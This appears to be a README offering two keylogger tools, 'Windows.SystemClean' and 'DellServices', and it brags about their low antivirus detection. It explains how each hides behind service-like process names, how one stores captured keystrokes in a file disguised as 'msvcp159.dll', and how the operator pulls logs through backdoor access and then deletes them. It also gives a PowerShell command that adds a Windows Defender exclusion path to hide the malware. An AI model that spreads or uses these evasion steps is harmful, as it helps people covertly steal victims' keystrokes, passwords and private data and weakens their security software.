# Easy-keyloggers

"Windows.SystemClean"
Has a Really Low Detection rate its Really Low because it does not send you an email, when running, it can be found in Task Manger as
"Windows.SystemClean" it save's the keylog file in "C:/Documents" as "msvcp159.dll" you can open it with notepad or notepad++
to view the logs, this keylogger has around a 2% Detection rate big name Detectors do not see this as a virus/keylogger to view 
the log's you would need direct access or backdoor access, i can't remember if it over wrights the log file or crates a new one
its best to delete the file after its Extracted or raed if the file is not there it will make a new one.

"DellServices"
This Key Logger has a Medium to high Detection rate. it does not send you an email, when running it can be found in Task Manger
as "DellServices" it save's the keylog file in C:/ProgarmData As "Dellsupport.txt" this keylogger has around a 50% Detection rate
Windows Defender can pick this up, but it can be hidden in side Widndows Defends Exclusion Flaw with simple code
( powershell -Command Add-MpPreference -ExclusionPath "$env:userprofile\Desktop\loadingBar2.bat" ) to view the log's
you would need direct access or backdoor access, i can't remember if it over wrights the log file or crates a new one
its best to delete the file after its Extracted or raed if the file is not there it will make a new one.
